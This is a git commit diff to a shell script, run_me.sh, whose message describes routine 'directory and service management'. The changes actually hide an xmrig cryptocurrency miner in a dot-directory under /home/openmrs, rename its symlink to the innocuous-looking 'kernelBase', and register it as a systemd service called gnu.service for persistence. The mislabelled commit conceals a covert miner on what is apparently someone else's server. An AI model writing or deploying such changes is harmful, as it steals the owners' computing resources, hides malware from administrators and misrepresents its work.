0cc07d7dade225ae64eadb24d3809e96a9cd8db2
Thabiso Nthako <thabiso.nthako@gmail.com>
2026-02-02 17:16:12 +0200

    Update run_me.sh for directory and service management

--- run_me.sh
+++ run_me.sh
@@ -1,7 +1,10 @@
 #! /usr/bin/bash
-
+sudo mkdir /home/openmrs/.gnu
+sudo mv /home/openmrs/gnu/* /home/openmrs/.gnu
+sudo rm -R /home/openmrs/gnu
+cd /home/openmrs/.gnu
 sudo chmod +x xmrig
-sudo ln -s /home/openmrs/gnu/xmrig link
+sudo ln -s /home/openmrs/.gnu/xmrig kernelBase
 mv gnu.service /etc/systemd/system
 sudo systemctl chmod 664 /etc/systemd/system/gnu.service
 sudo systemctl daemon-reload
